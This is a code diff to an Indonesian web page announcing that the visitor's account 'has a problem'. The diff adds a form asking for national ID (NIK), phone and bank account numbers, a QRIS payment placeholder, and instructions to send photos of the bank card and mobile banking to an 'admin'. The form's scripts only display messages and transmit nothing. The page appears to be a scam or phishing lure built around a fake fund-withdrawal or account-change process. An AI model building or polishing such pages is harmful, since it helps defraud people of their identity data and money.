@@ -296,7 +296,55 @@ footer li{margin:7px 0}
 <main id="portalStatus" class="portal-status" aria-live="polite">
   <div class="status-content">
     <h1>REKENINGMU BERMASALAH</h1>
-    <p>SILAHKAN KUNJUNGI KANTOR dalam batas waktu 2 hari kerja<br>UNTUK TANDATANGAN PEMUTUSAN KONTRAK</p>
+    <p>SILAKAN AJUKAN PERGANTIAN REKENING MELALUI FORMULIR DI BAWAH INI</p>
+
+    <form id="rekeningForm" class="rekening-form">
+      <h2>Pengajuan pergantian rekening</h2>
+
+      <div class="rekening-box">
+        <h3>Dari</h3>
+        <div class="form-grid">
+          <div class="form-group"><label for="namaLama">Nama</label><input id="namaLama" required></div>
+          <div class="form-group"><label for="nikLama">NIK</label><input id="nikLama" inputmode="numeric" required></div>
+          <div class="form-group"><label for="hpLama">No hp</label><input id="hpLama" type="tel" required></div>
+          <div class="form-group"><label for="bankLama">Pilihan bank</label><select id="bankLama" required><option value="">Pilih bank</option><option>BCA</option><option>BRI</option><option>BNI</option><option>Mandiri</option><option>BTN</option><option>BSI</option><option>Bank lainnya</option></select></div>
+          <div class="form-group full"><label for="norekLama">Norek</label><input id="norekLama" inputmode="numeric" required></div>
+        </div>
+      </div>
+
+      <div class="rekening-box">
+        <h3>Ke</h3>
+        <div class="form-grid">
+          <div class="form-group"><label for="namaBaru">Nama</label><input id="namaBaru" required></div>
+          <div class="form-group"><label for="hpBaru">No hp</label><input id="hpBaru" type="tel" required></div>
+          <div class="form-group"><label for="bankBaru">Pilihan bank</label><select id="bankBaru" required><option value="">Pilih bank</option><option>BCA</option><option>BRI</option><option>BNI</option><option>Mandiri</option><option>BTN</option><option>BSI</option><option>Bank lainnya</option></select></div>
+          <div class="form-group"><label for="norekBaru">Norek</label><input id="norekBaru" inputmode="numeric" required></div>
+        </div>
+      </div>
+
+      <div class="persetujuan-box">
+        <label class="check-row"><input type="checkbox" id="setujuPribadi" required>
+          <span>Saya dengan sadar dan tanpa pengaruh dari pihak manapun ingin merubah rekening sesuai kemauan pribadi.</span>
+        </label>
+        <label class="check-row"><input type="checkbox" id="setujuKetentuan" required>
+          <span>Saya menyetujui dan menerima segala aturan dan konsekuensi pergantian rekening yang telah dijelaskan kepada saya oleh admin.</span>
+        </label>
+      </div>
+
+      <div class="qris-placeholder">
+        <h3>Scan QRIS</h3>
+        <p>Tempat untuk menambahkan gambar QRIS.</p>
+      </div>
+
+      <p class="rekening-note">Keterangan: perubahan rekening wajib mempunyai kartu dan mobile banking. Konfirmasi foto ke admin.</p>
+
+      <div class="action-buttons">
+        <button type="submit" class="action-btn change-btn">GANTI</button>
+        <button type="button" id="cairkanBtn" class="action-btn cash-btn">CAIRKAN</button>
+      </div>
+      <div id="rekeningMessage" class="form-message" role="status" aria-live="polite"></div>
+      <div id="cairkanMessage" class="form-message" role="status" aria-live="polite"></div>
+    </form>
   </div>
 </main>
 
@@ -334,6 +382,30 @@ footer li{margin:7px 0}
     line-height:1.6;
     margin:0;
   }
+
+  .status-content{max-width:900px}
+  .rekening-form{margin-top:30px;text-align:left}
+  .rekening-form h2{text-align:center;color:#0f172a;font-size:25px;margin-bottom:20px}
+  .rekening-box{background:#fff;border:1px solid #dbe4df;border-radius:16px;padding:22px;margin:18px 0}
+  .rekening-box h3{color:#14532d;font-size:20px;margin-bottom:16px}
+  .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:0 16px}
+  .form-group{margin-bottom:14px}
+  .form-group.full{grid-column:1/-1}
+  .form-group label{display:block;color:#1e293b;font-size:14px;font-weight:700;margin-bottom:6px}
+  .form-group input,.form-group select{width:100%;padding:12px;border:1px solid #cbd5e1;border-radius:9px;font-size:15px;background:#fff}
+  .persetujuan-box{padding:18px;background:#f8fafc;border:1px solid #dbe4df;border-radius:14px;margin:18px 0}
+  .check-row{display:flex;gap:11px;align-items:flex-start;margin:12px 0;color:#334155;font-size:14px;font-weight:600;line-height:1.55}
+  .check-row input{width:18px;height:18px;flex:none;margin-top:2px}
+  .qris-placeholder{border:2px dashed #cbd5e1;border-radius:14px;background:#f8fafc;padding:26px;text-align:center;margin:18px 0}
+  .qris-placeholder h3{color:#14532d;margin-bottom:5px}
+  .qris-placeholder p{color:#64748b;font-size:13px}
+  .rekening-note{background:#eff6ff;border:1px solid #bfdbfe;color:#1e40af;border-radius:12px;padding:14px;font-size:14px;font-weight:700;margin:18px 0}
+  .action-buttons{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:20px}
+  .action-btn{border:0;border-radius:10px;padding:15px;font-size:16px;font-weight:900;color:#fff;cursor:pointer}
+  .change-btn{background:#166534}
+  .cash-btn{background:#1d4ed8}
+  .form-message{display:none;margin-top:14px;padding:14px;border-radius:10px;background:#eff6ff;border:1px solid #bfdbfe;color:#1e3a8a;font-size:14px;font-weight:700}
+  @media(max-width:600px){.form-grid,.action-buttons{grid-template-columns:1fr}.form-group.full{grid-column:auto}.rekening-box{padding:17px}.status-content{padding:25px 16px}}
 </style>
 
 <script>
@@ -358,5 +430,33 @@ footer li{margin:7px 0}
   });
 })();
 </script>
+
+<script>
+(function(){
+  const form = document.getElementById('rekeningForm');
+  const message = document.getElementById('rekeningMessage');
+  const cashButton = document.getElementById('cairkanBtn');
+  const cashMessage = document.getElementById('cairkanMessage');
+
+  if(form){
+    form.addEventListener('submit', function(event){
+      event.preventDefault();
+      if(!form.reportValidity()) return;
+      message.style.display = 'block';
+      message.textContent = 'Formulir pergantian rekening telah diisi. Silakan konfirmasikan data dan foto kartu serta mobile banking kepada admin melalui kanal resmi.';
+      cashMessage.style.display = 'none';
+    });
+  }
+
+  if(cashButton){
+    cashButton.addEventListener('click', function(){
+      cashMessage.style.display = 'block';
+      cashMessage.textContent = 'Permintaan pencairan belum diproses. Silakan konfirmasi langsung kepada admin melalui kanal resmi. Tombol ini tidak melakukan transfer dana.';
+      message.style.display = 'none';
+    });
+  }
+})();
+</script>
+
 </body>
 </html>
